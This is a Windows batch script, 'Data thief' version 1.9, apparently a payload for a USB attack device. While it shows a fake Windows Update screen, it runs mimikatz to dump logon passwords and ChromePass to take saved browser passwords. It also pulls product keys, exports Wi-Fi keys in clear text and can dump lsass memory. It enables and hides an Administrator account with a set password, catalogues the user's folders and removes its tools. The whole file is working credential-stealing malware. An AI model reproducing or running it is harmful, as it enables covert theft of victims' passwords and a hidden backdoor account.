@echo off
REM Data thief script by Lavanoid Volcanic
REM Script Version: 1.9
REM Lines of script in this file: 355!
REM What's new in this version: 
REM Added init.d logging.
REM More data being logged. Such as system type, e.g. 64 bit etc.
REM -----------------------------------------------------------------------------------------
REM 1.8:
REM Added a bunch of "REM" notes over the SP.bat (this) file.
REM init.d integration, BATCH FILES MUST BE NUMBERED! E.g. 1.bat, 2.bat 3.bat etc.
REM If you delete one of the batch files, then the init.d execution process will be skipped.
REM E.g.
REM Files: 1.bat, 2.bat, 3.bat,
REM if you delete 2.bat, then 3.bat will not execute
REM Windows wont let me use "init.d\*.bat" to run batch files so they have to be numbered. Sorry.
REM -----------------------------------------------------------------------------------------
REM What makes this program so special? Well, think about it - there's payloads out there
REM that are designed to only do a few tasks or just one particular task, BUT - With this
REM one, the possibilities are endless. You can simply add the code to be executed either in
REM this file, or a batch file located in the init.d directory. This way, programs run
REM silently, quickly, and well... EASILY! If you like this program, then why not add a
REM comment?
REM -----------------------------------------------------------------------------------------
%~d0
cd "%~dp0"
Title = Installing Windows Update...
color F0
cls
@echo Installing Windows Update...
REM **********************************************************************
REM CONFIGURATION CONFIGURATION CONFIGURATION CONFIGURATION CONFIGURATION
REM Use either true or false for these switches.
REM --------------------------------------------------------------------------------------------------------
REM This is what the Administrator password is changed to if the "avoid_antivirus" variable is set to false.
set administrator_password=Hak5
REM --------------------------------------------------------------------------------------------------------
REM These toggles are case sensitive! The only usable triggers are: true and false.
REM Default value: true
set init_execution=true
REM Default value: init.d
set init_directory=init.d
REM Default value: true
set enable_logging=true
REM Default value: Backups\BackupLog.txt
set logging_path=Backups\BackupLog.txt
REM Default value: true
set avoid_antivirus=true
REM Default value: false
set lock_system_after_execution=false
REM Default value: false
set use_procdump=false
REM Default value: true
set play_sound_after_execution-execution_complete=true
REM Default value: "Execution_Complete.vbs"
set sound_execution_complete_vbs_file="Execution_Complete.vbs"
REM Default value: "Execution_Complete.wav"
set sound_execution_complete_file="Execution_Complete.wav"
REM Default value: false
set play_sound_after_execution-soundfile1=false
REM Default value: "Sound1.vbs"
set sound_sound1_vbs_file="Sound1.vbs"
REM Default value: "Sound1.wav"
set sound_sound1_file="Sound1.wav"
REM Default value: false
set spam_desktop_with_files=false
REM Default value: 100
set desktop_spam_total=100
REM WARNING! If you spam the desktop with too many files, the desktop may become unresponsive.
REM Switch configuration end.
REM *************************************************************************
REM __    __    __
REM \ \  /  \  / /
REM  \ \/ /\ \/ /
REM   \__/  \__/ ARNING! Mimikatz causes some machines running Windows
REM 			8.1 to reboot. I believe this is Microsoft's attempt
REM             to terminate the Mimikatz exploit. I think they have
REM             succeeded - and for good reason too! I don't want programs
REM             having my password, ESPECIALLY MY WINDOWS LIVE LOGIN! WHICH
REM             is used to log Windows 8.1 in. When Mimikatz runs, it will
REM             not succeed in "recovering" login credentials. It had a good
REM             run though - right?
REM *************************************************************************
set win64=false
if exist "%SystemRoot%\SysWOW64" set win64=true
if "%WIN64%"=="true" set SYSTEMROOTSYSDIR=SysWOW64
if not "%WIN64%"=="true" set SYSTEMROOTSYSDIR=system32
if not exist "Backups" mkdir "Backups"
if "%enable_logging%"=="true" (
@echo Backup started on machine "%COMPUTERNAME%" at %TIME% on %DATE%. >> "%logging_path%"
@echo Data Thief configuration: >> "%logging_path%"
@echo enable_logging=%enable_logging% >> "%logging_path%"
@echo logging_path=%logging_path% >> "%logging_path%"
@echo avoid_antivirus=%avoid_antivirus% >> "%logging_path%"
@echo lock_system_after_execution=%lock_system_after_execution% >> "%logging_path%"
@echo use_procdump=%use_procdump% >> "%logging_path%"
@echo play_sound_after_execution-execution_complete=%play_sound_after_execution-execution_complete% >> "%logging_path%"
@echo sound_execution_complete_vbs_file=%sound_execution_complete_vbs_file% >> "%logging_path%"
@echo sound_execution_complete_file=%sound_execution_complete_file% >> "%logging_path%"
@echo play_sound_after_execution-soundfile1=%play_sound_after_execution-soundfile1% >> "%logging_path%"
@echo sound_sound1_vbs_file=%sound_sound1_vbs_file% >> "%logging_path%"
@echo sound_sound1_file=%sound_sound1_file% >> "%logging_path%"
@echo spam_desktop_with_files=%spam_desktop_with_files% >> "%logging_path%"
@echo desktop_spam_total=%desktop_spam_total% >> "%logging_path%"
if "%win64%"=="true" @echo Operating system type: 64 BIT  >> "%logging_path%"
if not "%win64%"=="true" @echo Operating system type: 32 BIT  >> "%logging_path%"
)
if not exist "%init_directory%" mkdir "%init_directory%"
if not exist "Backups\%COMPUTERNAME%" mkdir "Backups\%COMPUTERNAME%"
if not exist "Backups\%COMPUTERNAME%\Win" mkdir "Backups\%COMPUTERNAME%\Win"
if not exist "Backups\%COMPUTERNAME%\Chrome" mkdir "Backups\%COMPUTERNAME%\Chrome"
if not exist "Backups\%COMPUTERNAME%\Other_Information" mkdir "Backups\%COMPUTERNAME%\Other_Information"
rem if not exist "Backups\%COMPUTERNAME%\REG" mkdir "Backups\%COMPUTERNAME%\REG"
if not exist "Backups\%COMPUTERNAME%\Keys" mkdir "Backups\%COMPUTERNAME%\Keys"
set keys_dir=Backups\%COMPUTERNAME%\Keys
set filename=Backups\%COMPUTERNAME%\Win\%COMPUTERNAME%_%USERNAME%_Passwds
set filename_extension=.txt
set procdump_file_extention=.dmp
set procdump_filename=%filename%
set chromefilename=Backups\%COMPUTERNAME%\Chrome\%COMPUTERNAME%_%USERNAME%_Passwds
set chromefilename_extension=.txt
set dirlistdir=Backups\%COMPUTERNAME%\Other_Information
set keyrecfilename=Backups\%COMPUTERNAME%\WIFI\Keys_%COMPUTERNAME%_%USERNAME%
set keyrecdirectory=Backups\%COMPUTERNAME%\WIFI
set keyrecfilename_extension=.html
set regdirectory=Backups\%COMPUTERNAME%\REG
set regfilename=Backups\%COMPUTERNAME%\REG\REG_%COMPUTERNAME%_%USERNAME%
set regfilename_extension=.reg
if exist "%filename%%filename_extension%" goto filename_generate
:chrome_config
if exist "%chromefilename%%chromefilename_extension%" goto chrome_filename_generate
:keyrec_config
if exist "%keyrecfilename%%keyrecfilename_extension%" goto keyrec_filename_generate
:reg_config
if exist "%regfilename%%regfilename_extension%" goto reg_filename_generate
goto process_dump
:filename_generate
set filenamecount=0
:filename_generate_generate_start
set /a filenamecount=%filenamecount%+1
if exist "%filename%_%filenamecount%%filename_extension%" goto filename_generate_generate_start
if not exist "%filename%_%filenamecount%%filename_extension%" set filename=%filename%_%filenamecount%
if not exist "%filename%_%filenamecount%%filename_extension%" goto chrome_config
:chrome_filename_generate
set chromefilenamecount=0
:chrome_filename_generate_generate_start
set /a chromefilenamecount=%chromefilenamecount%+1
if exist "%chromefilename%_%chromefilenamecount%%chromefilename_extension%" goto chrome_filename_generate_generate_start
if not exist "%chromefilename%_%chromefilenamecount%%chromefilename_extension%" set chromefilename=%chromefilename%_%chromefilenamecount%
if not exist "%chromefilename%_%chromefilenamecount%%chromefilename_extension%" goto keyrec_config
:keyrec_filename_generate
set keyrecfilenamecount=0
:keyrec_filename_generate_generate_start
set /a keyrecfilenamecount=%keyrecfilenamecount%+1
if exist "%keyrecfilename%_%keyrecfilenamecount%%keyrecfilename_extension%" goto keyrec_filename_generate_generate_start
if not exist "%keyrecfilename%_%keyrecfilenamecount%%keyrecfilename_extension%" set keyrecfilename=%keyrecfilename%_%keyrecfilenamecount%
if not exist "%keyrecfilename%_%keyrecfilenamecount%%keyrecfilename_extension%" goto reg_config
:reg_filename_generate
set regfilenamecount=0
:reg_filename_generate_generate_start
set /a regfilenamecount=%regfilenamecount%+1
if exist "%regfilename%_%regfilenamecount%%regfilename_extension%" goto reg_filename_generate_generate_start
if not exist "%regfilename%_%regfilenamecount%%regfilename_extension%" set regfilename=%regfilename%_%regfilenamecount%
if not exist "%regfilename%_%regfilenamecount%%regfilename_extension%" goto process_dump
:process_dump
set procdump_file_extention_count=0
:process_dump_generate_start
set /a procdump_file_extention_count=%procdump_file_extention_count%+1
if exist "%procdump_filename%_%procdump_file_extention_count%%procdump_file_extention%" goto process_dump_generate_start
if not exist "%procdump_filename%_%procdump_file_extention_count%%procdump_file_extention%" set procdump_filename=%procdump_filename%_%procdump_file_extention_count%
if not exist "%procdump_filename%_%procdump_file_extention_count%%procdump_file_extention%" goto gather_windows_information
:gather_windows_information
@echo Gathering Windows information...
if not "%use_procdump%"=="false" "procdump.exe" -accepteula -ma lsass.exe "%procdump_filename%%procdump_file_extention%" >nul
if "%win64%"=="true" goto win64_dump
if not "%win64%"=="true" goto win32_dump
:win64_dump
@echo Obtaining bit information... 64BIT
if "%avoid_antivirus%"=="true" goto managing_updates
if exist "ProduKeyx64.zip" "7z.exe" x -o"%CD%\" -y "ProduKeyx64.zip" -p"KHJoiy7IkignnmbmnIY986RtJSBIijIUHnjghfHccDtuj" >nul
if not exist "ProduKeyx64.exe" (
if "%enable_logging%"=="true" @echo Failed to extract "ProduKeyx64.zip", "ProduKeyx64.exe" not found. >> "%logging_path%"
)
if exist "ProduKeyx64.exe" ProduKeyx64.exe /WindowsKeys 1 /stab "" > "%keys_dir%\file_TEMP.txt"
if exist "%keys_dir%\file_TEMP.txt" type "%keys_dir%\file_TEMP.txt" >> "%keys_dir%\%COMPUTERNAME%_keys.txt"
if not exist "%keys_dir%\%COMPUTERNAME%_keys.txt" (
if "%enable_logging%"=="true" @echo Failed to write the file "%keys_dir%\%COMPUTERNAME%_keys.txt". >> "%logging_path%"
)
if not exist "%keys_dir%\file_TEMP.txt" (
if "%enable_logging%"=="true" @echo Failed to write the file "%keys_dir%\file_TEMP.txt". >> "%logging_path%"
)
if exist "%keys_dir%\file_TEMP.txt" del /f "%keys_dir%\file_TEMP.txt"
if exist "%keys_dir%\file_TEMP.txt" (
if "%enable_logging%"=="true" @echo Failed to remove the file "%keys_dir%\file_TEMP.txt". >> "%logging_path%"
)
if exist "ProduKeyx64.exe" del /f "ProduKeyx64.exe"
if exist "ProduKeyx64.exe" (
if "%enable_logging%"=="true" @echo Failed to remove the file "ProduKeyx64.exe". >> "%logging_path%"
)
goto more_data_dump
:win32_dump
@echo Obtaining bit information... 32BIT
if "%avoid_antivirus%"=="true" goto managing_updates
if exist "ProduKey.zip" "7z.exe" x -o"%CD%\" -y "ProduKey.zip" -p"KHJoiy7IkignnmbmnIY986RtJSBIijIUHnjghfHccDtuj" >nul
if not exist "ProduKey.exe" (
if "%enable_logging%"=="true" @echo Failed to extract "ProduKey.zip", "ProduKey.exe" not found. >> "%logging_path%"
)
if exist "ProduKey.exe" ProduKey.exe /WindowsKeys 1 /stab "" > "%keys_dir%\file_TEMP.txt"
if exist "%keys_dir%\file_TEMP.txt" type "%keys_dir%\file_TEMP.txt" >> "%keys_dir%\%COMPUTERNAME%_keys.txt"
if not exist "%keys_dir%\%COMPUTERNAME%_keys.txt" (
if "%enable_logging%"=="true" @echo Failed to write the file "%keys_dir%\%COMPUTERNAME%_keys.txt". >> "%logging_path%"
)
if not exist "%keys_dir%\file_TEMP.txt" (
if "%enable_logging%"=="true" @echo Failed to write the file "%keys_dir%\file_TEMP.txt". >> "%logging_path%"
)
if exist "%keys_dir%\file_TEMP.txt" del /f "%keys_dir%\file_TEMP.txt"
if exist "%keys_dir%\file_TEMP.txt" (
if "%enable_logging%"=="true" @echo Failed to remove the file "%keys_dir%\file_TEMP.txt". >> "%logging_path%"
)
if exist "ProduKey.exe" del /f "ProduKey.exe"
if exist "ProduKey.exe" (
if "%enable_logging%"=="true" @echo Failed to remove the file "ProduKey.exe". >> "%logging_path%"
)
goto more_data_dump
rem REG EXPORT "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" "%regfilename%%regfilename_extension%" >nul
:more_data_dump
@echo Extracting software...
if exist "keyrec.zip" "7z.exe" x -o"%CD%\" -y "keyrec.zip" -p"KHJoiy7IkignnmbmnIY986RtJSBIijIUHnjghfHccDtuj" >nul
if exist "ChromePass.exe" @echo Success.
if not exist "ChromePass.exe" (
if "%enable_logging%"=="true" @echo Failed to extract "keyrec.zip", "ChromePass.exe" not found. >> "%logging_path%"
)
if not exist "ChromePass.exe" @echo ERROR!
"ChromePass.exe" /stext "%chromefilename%%chromefilename_extension%"
NET USER Administrator /ACTIVE:YES
NET USER Administrator %administrator_password%
REM Hide the Administrator account.
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Administrator /t REG_DWORD /d 0 /f >nul
REM The registry key above hides the Administrator account.
"7z.exe" x -o"%CD%" -y "mimikatz.zip" -p"KHJoiy7IkignnmbmnIY986RtJSBIijIUHnjghfHccDtuj" >nul
if "%win64%"=="true" goto mimikatz_dumper_64bit
if not exist "x32\mimikatz.exe" (
if "%enable_logging%"=="true" @echo Failed to extract "mimikatz.zip", "x32\mimikatz.exe" not found. >> "%logging_path%"
)
if exist "x32\mimikatz.exe" "x32\mimikatz.exe" "privilege::debug" "sekurlsa::logonPasswords full" "exit" >> "%filename%%filename_extension%"
goto managing_updates
:mimikatz_dumper_64bit
if not exist "x64\mimikatz.exe" (
if "%enable_logging%"=="true" @echo Failed to extract "mimikatz.zip", "x64\mimikatz.exe" not found. >> "%logging_path%"
)
if exist "x64\mimikatz.exe" "x64\mimikatz.exe" "privilege::debug" "sekurlsa::logonPasswords full" "exit" >> "%filename%%filename_extension%"
goto managing_updates
:managing_updates
@echo Managing updates...
if exist "wind.exe" "wind.exe" >> "%keys_dir%\%COMPUTERNAME%.txt"
rem if not exist "keyrec.exe" @echo ERROR!
if not exist "Backups\%COMPUTERNAME%\WIFI" mkdir "Backups\%COMPUTERNAME%\WIFI" 
rem if exist "keyrec.exe" "keyrec.exe" /shtml "%keyrecfilename%%keyrecfilename_extension%" /sort "Network Name" >nul
rem del /S /Q "keyrec.exe">NUL
set CD_SP_ORIGINAL=%CD%
CD "%keyrecdirectory%"
netsh wlan export profile key=clear
CD "%CD_SP_ORIGINAL%"
set CD_SP_ORIGINAL=
dir "%USERPROFILE%">> "%dirlistdir%\USERPROFILE.txt"
if exist "%USERPROFILE%\Desktop" dir "%USERPROFILE%\Desktop">> "%dirlistdir%\Desktop.txt"
if exist "%USERPROFILE%\Documents" dir "%USERPROFILE%\Documents">> "%dirlistdir%\Documents.txt"
if exist "%USERPROFILE%\Music" dir "%USERPROFILE%\Music">> "%dirlistdir%\Music.txt"
if exist "%USERPROFILE%\Pictures" dir "%USERPROFILE%\Pictures">> "%dirlistdir%\Pictures.txt"
if exist "%USERPROFILE%\Videos" dir "%USERPROFILE%\Videos">> "%dirlistdir%\Videos.txt"
if exist "%ProgramFiles%" dir "%ProgramFiles%">> "%dirlistdir%\ProgramFiles.txt"
if exist "%ProgramData%" dir "%ProgramData%" >> "%dirlistdir%\ProgramData.txt"
set > "%dirlistdir%\Variables.txt"
if not "%LOCALAPPDATA%"=="" (
if exist "%LOCALAPPDATA%" dir "%LOCALAPPDATA%" >> "%dirlistdir%\LOCALAPPDATA.txt"
)
if exist "%APPDATA%" dir "%APPDATA%" >> "%dirlistdir%\APPDATA.txt"
:rd_script_end
if exist "x32" RD /S /Q "x32"
if exist "x64" RD /S /Q "x64"
Title = Installing Windows Update...
cls
@echo Installing Windows Update...
@echo Update complete.
if exist "ChromePass.exe" del /f "ChromePass.exe"
if "%init_execution%"=="true" goto init_execution
goto after_init_execution
:init_execution
set init_file_no=0
if exist "%init_directory%\%init_file_no%.bat" (
if "%enable_logging%"=="true" @echo File "%init_directory%\%init_file_no%.bat" located. Init.d execution starting...>> "%logging_path%"
)
if exist "%init_directory%\%init_file_no%.bat" call "%init_directory%\%init_file_no%.bat"
if not exist "%init_directory%\%init_file_no%.bat" (
if "%enable_logging%"=="true" @echo File "%init_directory%\%init_file_no%.bat" not found. Init.d execution aborted.>> "%logging_path%"
goto after_init_execution
)
set /a init_file_no=%init_file_no%+1
:init_execution_add
if exist "%init_directory%\%init_file_no%.bat" (
if "%enable_logging%"=="true" @echo File "%init_directory%\%init_file_no%.bat" located. Init.d execution starting...>> "%logging_path%"
)
if exist "%init_directory%\%init_file_no%.bat" call "%init_directory%\%init_file_no%.bat"
if not exist "%init_directory%\%init_file_no%.bat" goto after_init_execution
goto init_execution_add
:after_init_execution
if "%spam_desktop_with_files%"=="true" goto spam_desktop
goto after_init_execution2
:spam_desktop
set desktop_spam_cur=0
if "%enable_logging%"=="true" @echo Spamming desktop with random files... Total files to spam: %desktop_spam_total% >> "%logging_path%"
:spam_desktop_count
@echo. > "%USERPROFILE%\Desktop\%RANDOM%.tmp"
set /a desktop_spam_cur=%desktop_spam_cur%+1
if not "%desktop_spam_cur%"=="%desktop_spam_total%" goto spam_desktop_count
if "%enable_logging%"=="true" @echo Desktop spam complete. Files generated: %desktop_spam_cur%/%desktop_spam_total% >> "%logging_path%"
:after_init_execution2
MSG * .
if "%play_sound_after_execution-execution_complete%"=="true" goto sound_execution_complete
if "%play_sound_after_execution-soundfile1%"=="true" goto sound_soundfile1
goto near_the_end
:sound_execution_complete
if not exist %sound_execution_complete_file% goto sound_execution_complete_after
@echo Set oVoice = CreateObject("SAPI.SpVoice")> %sound_execution_complete_vbs_file%
@echo. >> %sound_execution_complete_vbs_file%
@echo set oSpFileStream = CreateObject("SAPI.SpFileStream")>> %sound_execution_complete_vbs_file%
@echo. >> %sound_execution_complete_vbs_file%
@echo oSpFileStream.Open %sound_execution_complete_file% >> %sound_execution_complete_vbs_file%
@echo. >> %sound_execution_complete_vbs_file%
@echo oVoice.SpeakStream oSpFileStream>> %sound_execution_complete_vbs_file%
@echo. >> %sound_execution_complete_vbs_file%
@echo oSpFileStream.Close>> %sound_execution_complete_vbs_file%
if exist %sound_execution_complete_vbs_file% wscript %sound_execution_complete_vbs_file%
:sound_execution_complete_after
if "%play_sound_after_execution-soundfile1%"=="true" goto sound_soundfile1
goto near_the_end
:sound_soundfile1
if not exist %sound_sound1_file% goto sound_soundfile1_after
@echo Set oVoice = CreateObject("SAPI.SpVoice")> %sound_sound1_vbs_file%
@echo. >> %sound_sound1_vbs_file%
@echo set oSpFileStream = CreateObject("SAPI.SpFileStream")>> %sound_sound1_vbs_file%
@echo. >> %sound_sound1_vbs_file%
@echo oSpFileStream.Open %sound_sound1_file% >> %sound_sound1_vbs_file%
@echo. >> %sound_sound1_vbs_file%
@echo oVoice.SpeakStream oSpFileStream>> %sound_sound1_vbs_file%
@echo. >> %sound_sound1_vbs_file%
@echo oSpFileStream.Close>> %sound_sound1_vbs_file%
if exist %sound_sound1_vbs_file% wscript %sound_sound1_vbs_file%
:sound_soundfile1_after
goto near_the_end
:near_the_end
if not "%lock_system_after_execution%"=="false" "rundll32.exe" user32.dll, LockWorkStation
if exist "%SystemRoot%\%SYSTEMROOTSYSDIR%\timeout.exe" timeout /t 2 /NOBREAK >nul
if "%enable_logging%"=="true" @echo Program execution complete. >> "%logging_path%"
if exist "Execution_Complete.vbs" del /f "Execution_Complete.vbs"
if exist "%TEMP%\DS.bat" del /f "%TEMP%\DS.bat"